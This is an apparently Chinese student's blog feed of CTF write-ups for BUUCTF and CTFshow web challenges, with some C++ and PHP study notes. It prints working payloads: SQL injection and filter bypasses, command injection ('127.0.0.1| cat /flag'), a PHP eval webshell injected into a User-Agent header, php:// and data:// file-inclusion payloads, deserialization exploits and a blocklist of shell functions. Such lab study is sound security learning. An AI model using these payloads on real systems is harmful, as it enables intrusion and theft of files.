&#125;while(@mysqli_next_result($MysqlLink));&#125;?&gt;</code></pre><p><mark>$sql = “select “.$post[‘query’].”||flag from Flag”;<mark><br><br>这个应该是很重要的，我们知道了后端语句，构造*，1<br><br>$sql = select *,1||flag from Flag.<br>1和flag做逻辑或运算，相当于</p><p><img src="2.png"></p><p>可以查出所有的数据</p><p>但这好像不是预期解释</p><p>预期解释是运用 set sql_mode=PIPES_AS_CONCAT</p><p><img src="3.png"></p><p>这样可以把||转换为连接符</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hardsql</title>
      <link href="/2021/01/27/hardsql/"/>
      <url>/2021/01/27/hardsql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babysql</title>
      <link href="/2021/01/27/babysql/"/>
      <url>/2021/01/27/babysql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>学到了绕过方法，因为这个是提示为input your name password，说明关键字被替换为空格，显示为空，使用双写绕过</p><p><img src="1.png"></p><p>如果=被过滤，可以用like替代（模糊查找运算符），‘%’代表0次或n次任意字符，‘_’代表只匹配一次任意字符，<br><br>如果substr被过滤，可以使用left（），right（）这两个函数来替代<br><br>left(字符串,从左开始数几位)<br>right（字符串，从右开始数几位）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lovesql</title>
      <link href="/2021/01/26/postlovesql/"/>
      <url>/2021/01/26/postlovesql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>认识一个新的函数<br><br>concat_ws<br><br>一般写的是(‘<code>&#39;,password,&#39;</code>‘,name)<br><br>这个可以帮忙<br><br>concat_ws(‘`’,password,name)<br></p><p>回归正题</p><p><img src="1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战easysql</title>
      <link href="/2021/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98easysql/"/>
      <url>/2021/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98easysql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>这个主要是学习到了报错注入</p><p><img src="1.png"></p><p>一般登录界面用不到联合注入，联合注入是为了查询什么东西，比如id。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>postbuu刷题第四天 exec</title>
      <link href="/2021/01/19/postbuu%E5%88%B7%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
      <url>/2021/01/19/postbuu%E5%88%B7%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>比较简单的一道exec</h1><p>ping了一个127.0.0.1用 | 拼接了ls，/查看了根目录，然后cat，全程无过滤。127.0.0.1| cat /flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>复习一波</title>
      <link href="/2021/01/19/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2/"/>
      <url>/2021/01/19/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2/</url>
      
        <content type="html"><![CDATA[<p>#做了这么多道题，也来复习一下吧。</p><span id="more"></span><h1>两数之和</h1><pre><code>   #include &lt;iostream&gt; using namespace std;int main()&#123;int a[10]; int i,j,n; int t; cout&lt;&lt;&quot;输入你想要的目标值&quot;&lt;&lt;endl; cin&gt;&gt;t; cout&lt;&lt;&quot;输入十个数&quot;; for(i=0;i&lt;10;i++)&#123; cin&gt;&gt;j; a[i]=j; &#125; for(i=0;i&lt;10;i++)&#123; for(n=i+1;n&lt;10;n++)&#123;    if(a[i]+a[n]==t)&#123;        cout&lt;&lt;i&lt;&lt;&quot;  &quot;&lt;&lt;n&lt;&lt;endl;    &#125;&#125;&#125;&#125;</code></pre><p>这是我刚才重做了一遍，当时做的时候，对c以及c++了解甚少，还觉得很难，现在好多了，很顺利的就把代码敲了出来。</p><h1>exec</h1>想找这个题目在重做一遍，但是，找不到了。。。我做这道题不会的点是，有一个界面是<mark>notice:undefined index:ip in /var/www/html/exec1.php on lin5</mark><br>注意这里的undefined index是指未定义索引，是指你的参数没有传过来，所以应该在穿一个ip的参数。因为该界面下有提示<pre><code> 用法: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]        [-r count] [-s count] [[-j host-list] | [-k host-list]]        [-w timeout] [-R] [-S srcaddr] [-c compartment] [-p]        [-4] [-6] target_name选项: -t             Ping 指定的主机，直到停止。               若要查看统计信息并继续操作，请键入 Ctrl+Break；               若要停止，请键入 Ctrl+C。 -a             将地址解析为主机名。 -n count       要发送的回显请求数。 -l size        发送缓冲区大小。 -f             在数据包中设置“不分段”标记(仅适用于 IPv4)。 -i TTL         生存时间。 -v TOS         服务类型(仅适用于 IPv4。该设置已被弃用，               对 IP 标头中的服务类型字段没有任何               影响)。 -r count       记录计数跃点的路由(仅适用于 IPv4)。 -s count       计数跃点的时间戳(仅适用于 IPv4)。 -j host-list   与主机列表一起使用的松散源路由(仅适用于   IPv4)。 -k host-list    与主机列表一起使用的严格源路由(仅适用于  IPv4)。 -w timeout     等待每次回复的超时时间(毫秒)。 -R             同样使用路由标头测试反向路由(仅适用于 IPv6)。               根据 RFC 5095，已弃用此路由标头。               如果使用此标头，某些系统可能丢弃               回显请求。 -S srcaddr     要使用的源地址。 -c compartment 路由隔离舱标识符。 -p             Ping Hyper-V 网络虚拟化提供程序地址。 -4             强制使用 IPv4。 -6             强制使用 IPv6。</code></pre><p>ping的用法，所以想到构造ip=127.0.0.1，然后成功有接收到文件，然后就·命令执行绕过得到flag。</p><h1>两道rce</h1>说实在这两道题都很简单，然而那时候真的是太菜了，愣是找出了两个很难得做法。。。。真是无语了。content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>postbuu网鼎杯areunserialize</title>
      <link href="/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/"/>
      <url>/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code>    &lt;?phpinclude(&quot;flag.php&quot;); highlight_file(__FILE__);class FileHandler &#123;protected $op;protected $filename;protected $content;//类型为protectedfunction __construct() &#123;    $op = &quot;1&quot;;    $filename = &quot;/tmp/tmpfile&quot;;//这个tmp是临时执行文件    $content = &quot;Hello World!&quot;;    $this-&gt;process();&#125;public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;private function write() &#123;    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;        if(strlen((string)$this-&gt;content) &gt; 100) &#123;            $this-&gt;output(&quot;Too long!&quot;);            die();//退出脚本，所以要使用的话要让content的长度小于100        &#125;        $res = file_put_contents($this-&gt;filename, $this-&gt;content);//res为要让content的东西写入file的文件中去        if($res) $this-&gt;output(&quot;Successful!&quot;);        else $this-&gt;output(&quot;Failed!&quot;);    &#125; else &#123;        $this-&gt;output(&quot;Failed!&quot;);    &#125;&#125;private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);//把整个文件写入字符串中    &#125;    return $res;&#125;private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;&#125;function is_valid($s) &#123;for($i = 0; $i &lt; strlen($s); $i++)    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))//如果这个字符串的首位的ascii的值在32与125的区间里返回true        return false;return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;$str = (string)$_GET[&#39;str&#39;];//用get的方法传入一个参数if(is_valid($str)) &#123;//如果它是真的反序列化str    $obj = unserialize($str);&#125;&#125;</code></pre><p>先看这里<br></p><pre><code> if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;$str = (string)$_GET[&#39;str&#39;];if(is_valid($str)) &#123;    $obj = unserialize($str);&#125;</code></pre><p>用get的方法传入一个参数如果它通过了is_valid的检验，那么进行反序列化，通过检验的方法是字符串的ascii的值要在32~125之间。<br><br>因为这个类没有实例化对象，所以我们直接来到析构函数。<br></p><pre><code>function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;</code></pre><p>如果op的值为“2”，注意这里的2是字符串型，那么讲op的值赋为“1”，if之后是content的值为“”，执行process。<br></p><pre><code>        public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;</code></pre><p>如果op为1，那么执行write，但是emm，write对解题没有帮助，所以我们要让op的值为2，进行read,然后讲read的值给res，然后来到output。<br></p><pre><code>   private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);//把整个文件写入字符串中    &#125;    return $res;&#125;</code></pre><p>read这里是说让res的值为空，检验是否设定filename这个变量，然后读取filename的内容，返回res。<br></p><pre><code>     private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;</code></pre><p> 得到flag。</p><p>所以我们构造。</p><pre><code> &lt;?php     class FileHandler&#123;protected op=2;protected filename=&#39;flag.php&#39;;protected contentp;      &#125;   $obj=new FileHandler();  echo serialize($obj); ?&gt;   </code></pre><p>得到<mark>O:11:”FileHandler”:3:{s:5:”%00*%00op”;i:2;s:11:”%00*%00filename”;s:8:”flag.php”;s:10:”%00*%00content”;N;}</mark>但是这没有成功，因为is_vaile都没有过去，%00的ascii值好像是0.现在要绕过这个，有两种方法。<br></p><li>  <pre><code>    &lt;?php     class FileHandler&#123;public op=2;public filename=&#39;flag.php&#39;;public contentp;      &#125;   $obj=new FileHandler();  echo serialize($obj); ?&gt;     好像是php版本7.1以上，对变量的属性的要求不严格</code></pre><li><pre><code>  O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;/00*/00op&quot;;i:2;S:11:&quot;/00*/00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;/00*/00content&quot;;N;&#125;  讲s改为大写，%00可写为/00用16进制绕过</code></pre><p>然后·ctrl u查看页面源代码</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列学习&amp;buu刷题的第二天,CTFshow部分题目</title>
      <link href="/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>以此用来记录学习反序列化的时候遇见的题目</p><span id="more"></span><h1>题目一</h1><p><img src="1.png"></p><h1>题目二(buu极客大挑战php)</h1>打开题目，上面提示说备份网站，按照常规思路，备份网站应该是index.php.bak，但是出现了404，然后就想着扫一下目录。开始我用御剑没扫出来，就怀着侥幸的心理，我记得我以前做题的时候遇见过www.zip然后就真的成功了，后来看别人讲这道题的视频的时候，发现了一个ctf-wcan这个工具，于是再扫一下就真的成功了。格式为 python ctf-wcan.py url | gref 200(200是有成功回响的)。下载弹出来的压缩包，解压后有5个php文件。（有一个文件是flag.php，里面有一个flag，感觉这道题不会就这么简单，拿flag去验证一下，果然是错的。）<br>先分析是拿到index.php<p><img src="2.png"></p><p>真个index.php也就这里对我们解题有帮助。这也就提示了存在反序列化漏斗。因为我们对传入的参数可控。<BR><br>打开class.php</p><p><img src="3.png"></p><p>因为要进行反序列化，所以我们可以传入一个序列化的字符串，内容包括password=100,username=admin<br><br>于是得到<mark>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</mark><br>由于我们用的是private定于的变量，所以要改为<mark>O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</mark><br>于是构造？select=O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}，发现这个是没有回响的，为什么呢，因为我们知道反序列化的时候会自动调用__wakeup()这个魔术方法，它把username赋值为guest，所以我们要先怎么绕过这个魔术方法，在网上查绕过方式是让类的属性大于原来的时候，可以绕过该函数。欧克，？select=O:4:”Name”:<mark>3</mark>:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;},得到flag。</p><h1>题目三</h1><p><img src="4.png"></p><p>整道题的解题点就是让password全等于p让username等于u，然而我感觉这个$n 应该就是xxxxxx，$P 等于xxxxxx，<br>其实这道题应该就是对类的巩固，与反序列化应该没啥关系.</p><h1>题目四</h1>这道题乍一看跟上一道一样实则不然<p><img src="5.png"></p><p><img src="6.png"></p><h1>题目五</h1><p>这道题跟上一道题目不同的地方在于。</p><p><img src="7.png"></p><p>这段代码的意思是要让我们的username与password的值不同，但是这个类给两者的赋值都是xxxxxx，那么我们要怎么使这两者的值不相同呢？我们知道，上一道题目，我们的isvip是false但是我们构造一个字符串，使其反序列化，得到的值是true，那我们尝试构造使得usename=ab；password=abc；isvip=true，得到flag</p><p><img src="8.png"></p><H1>题目六</h1><p><img src="9.png"></p><p>拿到题后，先整理下思路，就是用get传入username和password具体的值是什么样子的对题目没有影响，然后进入下一步，反序列化user，然后到达析构函数，可以看到析构函数这里有一个getinfo（）。下面有两个类，都有getinfo（），但是第二个类中含有eval这个函数，该函数是可以执行php命令的，所以这里我们可以构造$code=<mark>‘</mark>system(‘ls’);<mark>‘</mark>;所以我们就该想怎么才能来到backdoor类这里。<br><br>因为我们看到析构函数那里是$this-&gt;class,所以我们可以尝试让$class=new backdoor();</p><p><img src="10.png"></p><p>然后cat，得到flag。<br><br>又在网上看到有大佬是这样构造的<mark>$code=’system(“cat f*”);’</mark></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu学习第二天（两题）</title>
      <link href="/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
      <url>/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>buu的第二天的学习。</p><span id="more"></span><p>因为上学期学习了文件包含，所以这次就选了一道文件包含的题目，有点简单。<br></p><h2>ACTF新生赛文件包含</h2>。<br>点开后是tips，点击进入下一个界面，然后有个提示。<br><mark>Can you find out the flag?</mark>然后我有观察到它的url是<mark>?file=flag.php</mark><BR>于是就直接伪协议读取?file=php://filter/read=convert.base64-encode/resource=flag.php得到flag。<h2>GXYCTF禁止套娃</h2><p>打开题目没有思路，扫描发现是.git泄露，然后就是</p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;        if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;            // echo $_GET[&#39;exp&#39;];            @eval($_GET[&#39;exp&#39;]);        &#125;        else&#123;            die(&quot;还差一点哦！&quot;);        &#125;    &#125;    else&#123;        die(&quot;再好好想想！&quot;);    &#125;&#125;else&#123;    die(&quot;还想读flag，臭弟弟！&quot;);&#125;&#125;// highlight_file(__FILE__);?&gt;</code></pre><p>过滤来那么多，就试试，无参数rce把，之前有一个博文写过</p><p>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>show_source(session_id(session_start()));<br>得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu warm up</title>
      <link href="/2021/01/15/up/"/>
      <url>/2021/01/15/up/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>开启buu刷题之路</p><span id="more"></span><p>拿到题目只有一个笑脸，查看源代码，发现里面有个source.php,打开后是一个php代码.<br><br>     <mark>$whitelist =[“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];</mark><br><br>看到这句代码，我查看了hint.php,该页面提示了flag存放的位置<br><br>     <mark>flag not here, and flag in ffffllllaaaagggg</mark><br><br>知道了flag存放的位置，就要开始知道这段代码到底是什么意思，我们怎么样才可以得到flag。<br></p><p><img src="1.png"></p><p>从这段代码我们知道了下一步该做什么<br></p><p><img src="2.png"><br>这里面有4个if条件句，只要有一个可以被调用，我们就可以得到flag<br><br>但显然第一个if对我们没有用<br><br>第二个if，如果我们要使其成立，我们就要构造有含有source.php或者hint.php，但是我们知道我们必需构造的参数中含有ffffllllaaaagggg，否则我们是拿不到flag，所以这个也是不可行的。<br><br>第三个if，因为这个是保留？以前的东西，所以我们可以构造file=source.php（或者hint.php）%3f（这个是？进行了url编码，如果直接是？，那么服务器会以为是提交的参数）./ffffllllaaaagggg参看当前目录是什么都没有的，然后../查看父级目录，?file=source.php%3f../../../../../ffffllllaaaagggg得到flag。<br><br>第四个if，这个是先解码，然后在保留？以前的东西，所以我们可以对？进行两次url编码，一个是先让服务器解码，一个是在类里面进行，构造?file=source.php%253f../../../../../ffffllllaaaagggg得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入学习</title>
      <link href="/2020/12/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/12/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>忘保存了，写了一半全没了。。。。。。。那就随便写写，本来写这个就是为了可以更好的理解sql注入，现在一半都没了，也就随便吧，无所谓了</p><span id="more"></span><h1>判断是否存在sql注入</h1><li>单引号判断法。如果页面返回错误则存在sql注入。因为无论是字符型还是整型都会因为单引号个数不匹配而报错]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web4,web5,web6，耗子尾汁</title>
      <link href="/2020/12/27/web4-web5-web6/"/>
      <url>/2020/12/27/web4-web5-web6/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>web4-6，耗子尾汁</p><span id="more"></span><h1>web4</h1>根据提示，我们可以知道是日志注入，文件包含<br>通过bp抓包在响应头除，可以发现其用的是nginx，所以找到其存放日志的地方是/var/log/nginx/access.log构造url，看到又回响，bp抓包，在user-agent出添加一句话木马<？php @eval(POST_["lucky"]);？>，链接，得到flag。<h1>web5</h1>代码很简单，就是让v1和v2的MD5值相同，然后v1（ctype_alpha）必需全为字母，v2（is_numeric）必需全为数字<br>v1=QNKCDZO&v2=240610708得到flag<h1>web6</h1>和前几天做的sql注入题目大概类似，就是随便输入一个密码，然后bp抓包，提示sql注入失败，得知这是一道sql注入题目，然后用admin' or 1=1#(#意思是注释掉后面的东西，所以密码可以随便输),此时无任何回响，发现空格被过滤了，通过百度，空格过滤可以用/**/绕过，显示登录成功，然后就是跟上次的sql注入相同，详见第二次学习报告。<h1>耗子尾汁</h1>还是一段php代码，可以看出的是error_reporting(0);<BR>highlight_file(__FILE__);<BR>$a = $_GET['a'];<BR>$b = $_GET['b'];<BR>function CTFSHOW_36_D($a,$b){<BR>    $dis = array<BR>("var_dump","exec","readfile","highlight_file","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents","");<BR>    $a = strtolower($a);<BR>    if (!in_array($a,$dis,true)) {<BR>        forward_static_call_array($a,$b);<BR>    }else{<BR>        echo 'hacker';<BR>    }<BR>}<BR>CTFSHOW_36_D($a,$b);<BR>echo "rlezphp!!!"; <BR>简单的说就是，如果数组a出现在dis中就输出echo，这是一位大佬写的博客（在php当中默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法），如果a没有出现在dis中就调用a，b。从官方说明当中可以知道forward_static_call_array — Call a static method and pass the arguments as array，也就是可以调用静态方法并且将数组作为参数从官方说明当中可以知道forward_static_call_array — Call a static method and pass the arguments as array，也就是可以调用静态方法并且将数组作为参数<br>参考前置知识因此我们不难想到payload:a=\system&b[]=ls之后a=\system&b[]=cat flag.php]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php学习之路基础篇</title>
      <link href="/2020/12/23/php%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
      <url>/2020/12/23/php%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>从php开始学起</p><span id="more"></span><h1>php的标记风格</h1><ul><li><i>xml风格</i><br><?php echo;?><LI><i>脚本风格</i><br><script language="php">echo;</script><li><i>简短风格</i><?echo;?><li>asp风格</li><%echo;%><p><img src="1.png"><br>haha，不想麻烦这在转来转去的。<br></p><h1>php注释的应用</h1><li><i>c++风格的单行注释（//）</i>在单行注释中，不要出现？>，因为解释器会认为php脚本结束，而去执行？>后面的代码。<?php echo; //?><LI><I>c风格的多行注释</I><?**echo;?><li><i>shell风格的注释（#）</i><?echo;        #?><p><img src="2.png"></p><h1>php的数据类型</h1>标量数据类型：boolean，integer,float,string.<br>复合型：array,object<br>特殊类型：null,resource<br>boolean:true,false<br>//在php中不是只有boolean是false，其他比如0，0.0，""都可以是false<br>//$是变量的标识符，无论是声明变量还是调用变量都应该是$符号。<br>string:可以用'',"",<<<<br>但是双引号所包含的变量会自动替换成实际数值。<br>/这里补充转义字符。<br>/感觉界定符用的好少啊。<br>$str=<<<std<br>要输出的字符串。<br>std<br>integer:16进制是0x,八进制是0.float:浮点型之间不能比较大小！！！<br>数组：三种语法格式。<br>$array=('value1','value2'...)<br>$array[key]='value'<br>$array=(key1=>value1,key2=>value2...)<br>其中key是数组的下标<br>resourse:null;空值，没有被赋予任何值，被赋予null，被unset（）<h1>转换数据类型<h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++实验</title>
      <link href="/2020/12/20/postc-%E5%AE%9E%E9%AA%8C/"/>
      <url>/2020/12/20/postc-%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>把计算机导论实验布置的实验总结一下</p><span id="more"></span><p><i>实验5.1</i></p>输出 <br>       ******************* <br><pre><code>I  love  computer ！&lt;br&gt;*******************&lt;br&gt;</code></pre><p>比较简单的<br></p><p><img src="1.png"></p><p><i>实验5.2</i></p>编写程序，从键盘输入两个实数a，b，计算表达式3a(b+4)/2的值，并输出结果。<p><img src="2.png"></p><p>设圆的半径r=1.5，圆柱高h=3，编程求圆的周长，圆面积，圆球表面积，圆球体积，圆柱体积，并输出计算机结果。<br><img src="3.png"></p><p><i>实验5.3</i></p>有一个函数：<br><pre><code>x (x&lt;1)&lt;br&gt;</code></pre><p>y=  2x-1 (1≤x＜10)<br><br>    3x (x≥10)<br><br>计算<br><img src="4.png"><br>编写程序，输入一个整数n，判断整数n能否同时被3和5整除，输出结果<BR><br><img src="5.png"></p><p><i>实验5.4</i></p><p>1）编写程序，输出50~100之间的所有能被9整除的数。<br><br><img src="6.png"></p><p>（2）编写程序，输出50~100之间的全部素数。<br><img src="7.png"><br>（3）编写程序，在屏幕上显示如下信息<br><img src="8.png"></p><p><i>实验5.5</i></p>显示![](9.png)<p><img src="10.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>目录遍历</h1>路径遍历攻击(目录遍历)旨在访问存储在web根目录文件夹之外的文件和目录。通过操控带有“点-斜线（...）”序列以及变化的文件或使用绝对文件路径来引用文件变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码，配置文件和关键系统文件。需要注意的是，系统访问控制(如在微软windows操作系统上锁定或使用文件)限制了对文件的访问权限。这种攻击也称为“点点斜杠”，“目录遍历”，‘目录爬升’和‘回溯’。]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>两道伪协议</title>
      <link href="/2020/12/04/%E7%AC%AC%E4%BA%8C%E5%91%A8wp/"/>
      <url>/2020/12/04/%E7%AC%AC%E4%BA%8C%E5%91%A8wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1><font color="DarkSeaGreen"><i>伪协议一</i></font></h1><p><img src="1.png" alt="1"></p><p>emmmm,拿道题目是一个正则表达式，看到把伪协议都过滤了，但是有一点这个正则匹配只是把小写的几个伪协议过滤了，所以我们可以用大写绕过<br><br>想了有几种构造方法<br></p><ul><li>?file=PHP://filter/resource=flag<li>?file=PHP://filter/read=convert.BASE.64-encode/resource=flag<li>?file=DATA://text/plain;BASE.64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZyIpOw==<li>?file=PHP://input<br>[POST DATA]&#60;?php system("cat flag");?&#62;</ul>但是最后只有第二个是成功的得到了base64编码<h1><font color="DarkSeaGreen"><i>伪协议二</i></font></h1>第二题多了一个str_replace(str_replace() 函数替换字符串中的一些字符（区分大小写）。)还有在正则匹配那多了个/i，这个东西是让正则匹配就是不用管大小写，所以第一题的做法就不可以了.但是通过学习这个str_replace的作用我们可以尝试去说把php构造成ptroyehp,把base整成btroyease。因为str_replace这个函数在这里的作用就是把这个troye替换为空，所以这样我们就成功的绕过了，得到了base64编码<p><img src="3.png" alt="3"></p><h1><font color="DarkSeaGreen"><i>ssrf1</i></font></h1>代码很简单，参数中要有unctf.com,而且过滤了许多伪协议，然后题目上又说‘啊这，这怎么...这file_get_contents()有啥用呢’，查找资料当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。这个方法可以在SSRF的众多协议被ban的情况下来进行读取文件<p>所以构造？url=lucky：//lucky/dotnet.com：//../../../../../flag,得到flag</p><p><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第二周学习报告</title>
      <link href="/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><h1><font color="DarkSeaGreen"><em>伪协议</em></font></h1>见另一篇博客，伪协议<h1><font color="DarkSeaGreen"><em>日志文件包含getshell</em></font></h1>见另一篇博客，漏洞积累。<h1><font color="DarkSeaGreen"><em>一周刷题记录</em></font></h1>做的都是一些比较基础的没有难度的题目。<br>第一个类型,文件收集<ul><li>第一题<br>web1:where is flag?<br>很简单的签到题，直接ctrl+u查看源代码得到flag<li>第二题<br>题目打开有一行信息是说无法查看源代码，确实shift+f12没有作用，一下有几种做法。<br>1.ctrl+u<br>2.在url前面加show resource：查看源代码<br>3.火狐浏览器菜单处有个web开发者点击查看源代码<br><li>第三题打开依旧是web3:where is flag?<br>此时查看源代码是没有用的，突然想到没思路就抓个包，果然，GO后得到flag<li>第四题<br>打开还是web5:where is flag ?<BR>害，看view hint说是跟phps源码泄露有关<br>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过web浏览器查看php代码的内容，因为用户无法直接通过web浏览器“看到”php文件的内容，所以要用phps文件代替。<br>所以直接在url后面添加index.phps弹出文件，用记事本打开得到flag。<br>第二个类型，文件包含<li>第一题<br>if(isset($_GET['file'])){<br>    $file = $_GET['file'];<br>    $file = str_replace("php", "???", $file);<br>    include($file);<br>}else{<br>    highlight_file(__FILE__);<br>}<br>因为暂时不知道出了什么问题，传不上图片，就直接把源码附上了<br>这里就是文件$file的php都配替换成了？？？<br>所以这里有几种方法<br>1.大写php，PHP://input[POST DATA]为<？php system ("ls");？><br>查看所有文件名，得到flag.php<br>然后[post data]为<?php system ("cat flag.php");?>或者是<？php system("cat flag,php|base.64");？><br>2.data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOw==(<?php system("ls");)<br>然后data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZyIpOw==(<?php system("cat flag.php");)<li>第二题<br>if(isset($_GET['file'])){<br>    $file = $_GET['file'];<br>    $file = str_replace("php", "???", $file);<br>    $file = str_replace("data", "???", $file);<br>    include($file);<br>}else{<br>    